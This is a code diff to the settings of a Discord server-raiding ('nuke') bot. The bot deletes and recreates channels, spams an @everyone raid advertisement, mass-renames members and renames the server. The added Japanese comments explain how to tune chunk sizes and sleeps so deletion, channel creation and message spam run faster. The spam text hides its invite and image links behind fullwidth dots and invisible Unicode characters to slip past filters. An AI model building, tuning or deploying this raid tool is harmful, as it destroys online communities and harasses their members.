@@ -17,12 +17,12 @@ INTENTS = discord.Intents.default()
 INTENTS.guilds = True
 INTENTS.messages = True
 INTENTS.message_content = True
-INTENTS.members = True  # メンバー一覧・編集に必要
+INTENTS.members = True  
 
 # Behavioral params
-ROLE_BASE = "ozeumember"
+ROLE_BASE = "ozeumember" # ロール名
 ROLE_COUNT = 0
-CHANNEL_BASE = "ozeu-nuke"
+CHANNEL_BASE = "ozeu-nuke" # チャンネル名
 CHANNEL_COUNT = 1
 
 REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeu-ozeu [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"
@@ -30,19 +30,19 @@ REPEAT_COUNT = 1  # 各チャンネルに送信する回数
 
 # Nickname & guild rename params
 CHANGE_NICKNAMES = True
-NICK_BASE = "おぜう様万歳！"
+NICK_BASE = "おぜう様万歳！" # 鯖内のメンバーのニックネーム
 NICK_CHUNK_SIZE = 12
 NICK_CHUNK_SLEEP = 0.12
-NEW_GUILD_NAME = "おぜう植民地"
+NEW_GUILD_NAME = "おぜう植民地" # サーバー名
 
 # Parallelism / timing
-DELETE_CHUNK_SIZE = 8
-DELETE_CHUNK_SLEEP = 0.08
-CREATE_CHUNK_SIZE = 6
-CREATE_CHUNK_SLEEP = 0.12
-MSG_CHUNK_SIZE = 10
-MSG_INTER_CHUNK_SLEEP = 0.01
-MSG_INTER_ROUND_SLEEP = 0.02
+DELETE_CHUNK_SIZE = 8 # あげると消すのが早くなる
+DELETE_CHUNK_SLEEP = 0.08 # 下げると消すのが早くなる
+CREATE_CHUNK_SIZE = 6 # あげると作るのが早くなる
+CREATE_CHUNK_SLEEP = 0.12 # 下げると作るのが早くなる
+MSG_CHUNK_SIZE = 10 # あげるとメッセが早くなる
+MSG_INTER_CHUNK_SLEEP = 0.01 # 下げるとメッセが早くなる
+MSG_INTER_ROUND_SLEEP = 0.02 # 下げるとメッセが早くなる
 POST_DELETE_WAIT = 2.0
 ROLE_SLEEP = 0.03
 
